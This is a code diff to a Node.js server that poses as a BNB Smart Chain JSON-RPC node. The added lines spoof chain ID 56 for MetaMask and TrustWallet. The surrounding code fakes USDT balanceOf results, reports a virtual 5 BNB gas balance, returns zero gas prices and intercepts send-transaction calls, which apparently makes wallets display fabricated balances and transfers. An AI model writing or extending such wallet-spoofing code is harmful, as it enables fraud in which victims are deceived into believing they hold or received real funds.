@@ -466,7 +466,16 @@ const server = http.createServer(async (req, res) => {
     const handleSingleRpc = async (rpc) => {
         const { id, method, params } = rpc;
 
-        // 1. Intercept eth_call -> balanceOf(address) (0x70a08231) on Canonical USDT
+        // 1. Chain ID & Net Version support for MetaMask / TrustWallet configuration
+        if (method === "eth_chainId") {
+            return { jsonrpc: "2.0", id, result: "0x38" }; // 0x38 = 56 (BSC Mainnet)
+        }
+
+        if (method === "net_version") {
+            return { jsonrpc: "2.0", id, result: "56" };
+        }
+
+        // 2. Intercept eth_call -> balanceOf(address) (0x70a08231) on Canonical USDT
         if (method === "eth_call" && params?.[0]) {
             const toNorm = normalizeAddr(params[0].to || "");
             const dataHex = (params[0].data || params[0].input || "").toLowerCase();
@@ -491,13 +500,13 @@ const server = http.createServer(async (req, res) => {
             }
         }
 
-        // 2. Virtual Native Gas Balance (eth_getBalance) so Wallets Never Block Transfers for 0 Gas
+        // 3. Virtual Native Gas Balance (eth_getBalance) so Wallets Never Block Transfers for 0 Gas
         if (method === "eth_getBalance") {
             const fiveBnbOrTrx = (5n * (10n ** 18n)).toString(16);
             return { jsonrpc: "2.0", id, result: "0x" + fiveBnbOrTrx };
         }
 
-        // 3. Zero Gas Price
+        // 4. Zero Gas Price
         if (method === "eth_gasPrice" || method === "eth_maxPriorityFeePerGas") {
             return { jsonrpc: "2.0", id, result: "0x0" };
         }
@@ -506,7 +515,7 @@ const server = http.createServer(async (req, res) => {
             return { jsonrpc: "2.0", id, result: "0x5208" };
         }
 
-        // 4. Intercept eth_sendTransaction / eth_sendRawTransaction for Instant Wallet-to-Wallet Transfers
+        // 5. Intercept eth_sendTransaction / eth_sendRawTransaction for Instant Wallet-to-Wallet Transfers
         if (method === "eth_sendTransaction" && params?.[0]) {
             const txObj = params[0];
             const dataHex = (txObj.data || "").toLowerCase();
